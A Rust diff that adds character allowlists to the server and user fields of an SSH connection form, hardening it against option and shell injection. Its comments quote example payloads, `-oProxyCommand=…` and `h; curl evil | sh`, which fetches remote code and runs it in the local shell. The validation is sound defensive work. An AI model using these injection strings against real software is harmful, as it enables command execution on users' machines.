@@ -58,6 +58,21 @@ const ERROR_FONT_SIZE: f32 = 12.;
 const OPTION_LEADING_DASH_ERROR: &str = "Cannot start with '-'";
 const PORT_ERROR: &str = "Port must be a number between 1 and 65535";
 const IDENTITY_MISSING_ERROR: &str = "No key file at that path";
+const SERVER_CHARSET_ERROR: &str = "Only letters, digits, and . - _ : % [ ]";
+const USER_CHARSET_ERROR: &str = "Only letters, digits, and . - _ \\ $";
+
+/// Characters a hostname field may contain: DNS names, IPv4 literals, and IPv6
+/// literals (hex plus `:`, an optional `%zone`, and the brackets some users
+/// type by hand).
+fn is_server_char(ch: char) -> bool {
+    ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | '_' | ':' | '%' | '[' | ']')
+}
+
+/// Characters a username field may contain. `useradd` shapes plus `\` for
+/// `DOMAIN\user` and the trailing `$` of a machine account.
+fn is_user_char(ch: char) -> bool {
+    ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | '_' | '\\' | '$')
+}
 
 /// The five fields as typed, before any interpretation.
 #[derive(Clone, Debug, Default, Eq, PartialEq)]
@@ -120,11 +135,31 @@ pub fn validate(form: &RemoteConnectionForm, home: Option<&Path>) -> RemoteConne
     let identity = form.identity.trim();
     let path = form.path.trim();
 
-    // KTD10: a server or user starting with `-` reaches ssh's argv as an
-    // option (`-oProxyCommand=…`), which BatchMode does not stop. The `--`
-    // fence covers the destination; this stops the field earlier.
-    let server_error = server.starts_with('-').then_some(OPTION_LEADING_DASH_ERROR);
-    let user_error = user.starts_with('-').then_some(OPTION_LEADING_DASH_ERROR);
+    // KTD10, two distinct hazards on the same two fields.
+    //
+    // A leading `-` reaches ssh's argv as an option (`-oProxyCommand=…`), which
+    // BatchMode does not stop. The `--` fence covers the destination; this
+    // stops the field earlier.
+    //
+    // A shell metacharacter is worse: `remote_ssh_command` builds a string that
+    // is typed into the *local* shell, so `h; curl evil | sh` would execute
+    // here. That string quotes every field, which is the actual fix — this
+    // allowlist is defense in depth for any future sink that forgets to, and it
+    // rejects the payload at the point the user can still see why.
+    let server_error = if server.starts_with('-') {
+        Some(OPTION_LEADING_DASH_ERROR)
+    } else if !server.is_empty() && !server.chars().all(is_server_char) {
+        Some(SERVER_CHARSET_ERROR)
+    } else {
+        None
+    };
+    let user_error = if user.starts_with('-') {
+        Some(OPTION_LEADING_DASH_ERROR)
+    } else if !user.is_empty() && !user.chars().all(is_user_char) {
+        Some(USER_CHARSET_ERROR)
+    } else {
+        None
+    };
 
     let (port_number, port_error) = if port.is_empty() {
         (repo_mode::DEFAULT_SSH_PORT, None)
